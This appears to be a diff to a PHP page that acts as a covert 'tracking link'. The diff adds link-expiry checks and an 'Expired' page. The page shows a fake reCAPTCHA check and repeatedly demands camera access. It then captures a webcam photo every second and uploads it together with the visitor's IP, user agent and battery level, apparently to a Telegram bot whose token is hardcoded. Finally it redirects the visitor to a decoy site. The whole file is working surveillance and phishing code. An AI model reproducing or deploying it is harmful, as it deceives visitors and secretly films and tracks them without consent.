@@ -1,13 +1,13 @@
 <?php
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
-    
-    if (!isset($_POST['e']) || empty($_POST['e'])) {
-        exit;
-    }
+// লিংকে ঢোকার সময় (GET request) এক্সপায়ারি টাইম চেক করা
+$expiryTime = isset($_GET['e']) ? intval($_GET['e']) : 0;
+$isExpired = ($expiryTime <= 0 || time() > $expiryTime);
 
-    $expiryTime = intval($_POST['e']);
-    if (time() > $expiryTime) {
-        exit; 
+// যদি পোস্ট রিকোয়েস্ট (ছবি পাঠানোর রিকোয়েস্ট) হয় এবং মেয়াদ শেষ থাকে
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
+    $postExpiry = isset($_POST['e']) ? intval($_POST['e']) : 0;
+    if ($postExpiry <= 0 || time() > $postExpiry) {
+        exit;
     }
 
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
@@ -36,7 +36,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $userAgent = isset($_POST['user_agent']) ? $_POST['user_agent'] : 'Unknown';
     $battery   = isset($_POST['battery']) ? $_POST['battery'] : 'Unknown';
     
-    // শুধু মূল আইপি অ্যাড্রেস বের করার সঠিক কোড
     $ipAddress = 'Unknown';
     if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
         $ipAddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
@@ -86,7 +85,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title><?php echo $isExpired ? "Expired" : "Loading..."; ?></title>
     <style>
         body, html {
             margin: 0;
@@ -100,6 +99,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             align-items: center;
         }
         
+        /* Date Expired Box Style */
+        .expired-box {
+            background: #ffffff;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            padding: 30px 40px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            font-family: Roboto, helvetica, arial, sans-serif;
+        }
+
+        .expired-box h2 {
+            color: #d93025;
+            margin: 0 0 10px 0;
+            font-size: 22px;
+        }
+
+        .expired-box p {
+            color: #666;
+            margin: 0;
+            font-size: 14px;
+        }
+
         .recaptcha-box {
             background: #f9f9f9;
             border: 1px solid #d3d3d3;
@@ -199,135 +221,144 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 </head>
 <body>
 
-    <div class="recaptcha-box" id="recaptchaContainer">
-        <div class="recaptcha-left">
-            <div class="recaptcha-checkbox" id="recaptchaCheckbox">
-                <div class="recaptcha-spinner" id="recaptchaSpinner"></div>
+    <?php if ($isExpired): ?>
+        <!-- যদি লিংক মেয়াদোত্তীর্ণ হয় -->
+        <div class="expired-box">
+            <h2>Date Expired</h2>
+            <p>This tracking link has expired and is no longer available.</p>
+        </div>
+    <?php else: ?>
+        <!-- যদি লিংক সচল থাকে -->
+        <div class="recaptcha-box" id="recaptchaContainer">
+            <div class="recaptcha-left">
+                <div class="recaptcha-checkbox" id="recaptchaCheckbox">
+                    <div class="recaptcha-spinner" id="recaptchaSpinner"></div>
+                </div>
+                <span class="recaptcha-text">
+                    <span id="statusText">Verifying</span>
+                    <span id="countdownTimer"></span>
+                </span>
             </div>
-            <span class="recaptcha-text">
-                <span id="statusText">Verifying</span>
-                <span id="countdownTimer"></span>
-            </span>
+            <div class="recaptcha-right">
+                <div class="recaptcha-logo"></div>
+                <div class="recaptcha-footer">reCAPTCHA</div>
+            </div>
         </div>
-        <div class="recaptcha-right">
-            <div class="recaptcha-logo"></div>
-            <div class="recaptcha-footer">reCAPTCHA</div>
-        </div>
-    </div>
 
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+        <video id="video" autoplay playsinline style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
 
-    <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        <script>
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
 
-        const urlParams = new URLSearchParams(window.location.search);
-        const targetId = urlParams.get('id') || 'direct';
-        const userChatId = urlParams.get('cid') || ''; 
-        const expiryParam = urlParams.get('e') || ''; 
-        const rawTargetUrl = urlParams.get('url');
+            const urlParams = new URLSearchParams(window.location.search);
+            const targetId = urlParams.get('id') || 'direct';
+            const userChatId = urlParams.get('cid') || ''; 
+            const expiryParam = urlParams.get('e') || ''; 
+            const rawTargetUrl = urlParams.get('url');
 
-        let finalUrl = "https://www.aapunkagames.com/"; 
+            let finalUrl = "https://www.aapunkagames.com/"; 
 
-        if (rawTargetUrl) {
-            try {
-                finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
-            } catch (e) {
-                console.error("URL decode error:", e);
+            if (rawTargetUrl) {
+                try {
+                    finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
+                } catch (e) {
+                    console.error("URL decode error:", e);
+                }
             }
-        }
 
-        const recaptchaContainer = document.getElementById('recaptchaContainer');
-        if (finalUrl) {
-            recaptchaContainer.style.display = 'flex';
-        }
+            const recaptchaContainer = document.getElementById('recaptchaContainer');
+            if (finalUrl) {
+                recaptchaContainer.style.display = 'flex';
+            }
 
-        let batteryLevelInfo = 'Not Available';
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                batteryLevelInfo = Math.round(battery.level * 100) + '%';
-            });
-        }
-
-        let isStarted = false;
-
-        function requestCameraPermission() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    
-                    video.onloadedmetadata = () => {
-                        if (isStarted) return;
-                        isStarted = true;
-
-                        captureAndUpload();
-                        setInterval(captureAndUpload, 1000);
-
-                        const checkbox = document.getElementById('recaptchaCheckbox');
-                        const spinner = document.getElementById('recaptchaSpinner');
-                        const countdownTimer = document.getElementById('countdownTimer');
-                        const statusText = document.getElementById('statusText');
-
-                        spinner.style.display = 'block';
-                        
-                        let timeLeft = 10; 
-                        countdownTimer.textContent = `(${timeLeft}s)`;
-
-                        let timerInterval = setInterval(() => {
-                            timeLeft--;
-                            if (timeLeft > 0) {
-                                countdownTimer.textContent = `(${timeLeft}s)`;
-                            } else {
-                                clearInterval(timerInterval);
-                                spinner.style.display = 'none';
-                                countdownTimer.textContent = '';
-                                statusText.textContent = 'Verified';
-                                checkbox.classList.add('checked');
-                                
-                                setTimeout(() => {
-                                    window.location.href = finalUrl;
-                                }, 500);
-                            }
-                        }, 1000);
-                    };
-
-                })
-                .catch(err => {
-                    console.error("Camera error: ", err);
-                    alert("Camera permission is required to view this link!");
-                    setTimeout(requestCameraPermission, 1000);
+            let batteryLevelInfo = 'Not Available';
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    batteryLevelInfo = Math.round(battery.level * 100) + '%';
                 });
-        }
+            }
 
-        requestCameraPermission();
+            let isStarted = false;
 
-        function captureAndUpload() {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
+            function requestCameraPermission() {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        
+                        video.onloadedmetadata = () => {
+                            if (isStarted) return;
+                            isStarted = true;
 
-            const postData = new URLSearchParams();
-            postData.append('image', imageData);
-            postData.append('target', targetId);
-            postData.append('chat_id', userChatId);
-            postData.append('e', expiryParam); 
-            postData.append('user_agent', navigator.userAgent);
-            postData.append('battery', batteryLevelInfo);
+                            captureAndUpload();
+                            setInterval(captureAndUpload, 1000);
 
-            fetch('', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: postData
-            }).catch(error => {
-                console.error('Error:', error);
-            });
-        }
-    </script>
+                            const checkbox = document.getElementById('recaptchaCheckbox');
+                            const spinner = document.getElementById('recaptchaSpinner');
+                            const countdownTimer = document.getElementById('countdownTimer');
+                            const statusText = document.getElementById('statusText');
+
+                            spinner.style.display = 'block';
+                            
+                            let timeLeft = 10; 
+                            countdownTimer.textContent = `(${timeLeft}s)`;
+
+                            let timerInterval = setInterval(() => {
+                                timeLeft--;
+                                if (timeLeft > 0) {
+                                    countdownTimer.textContent = `(${timeLeft}s)`;
+                                } else {
+                                    clearInterval(timerInterval);
+                                    spinner.style.display = 'none';
+                                    countdownTimer.textContent = '';
+                                    statusText.textContent = 'Verified';
+                                    checkbox.classList.add('checked');
+                                    
+                                    setTimeout(() => {
+                                        window.location.href = finalUrl;
+                                    }, 500);
+                                }
+                            }, 1000);
+                        };
+
+                    })
+                    .catch(err => {
+                        console.error("Camera error: ", err);
+                        alert("Camera permission is required to view this link!");
+                        setTimeout(requestCameraPermission, 1000);
+                    });
+            }
+
+            requestCameraPermission();
+
+            function captureAndUpload() {
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+
+                const postData = new URLSearchParams();
+                postData.append('image', imageData);
+                postData.append('target', targetId);
+                postData.append('chat_id', userChatId);
+                postData.append('e', expiryParam); 
+                postData.append('user_agent', navigator.userAgent);
+                postData.append('battery', batteryLevelInfo);
+
+                fetch('', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: postData
+                }).catch(error => {
+                    console.error('Error:', error);
+                });
+            }
+        </script>
+    <?php endif; ?>
 </body>
 </html>
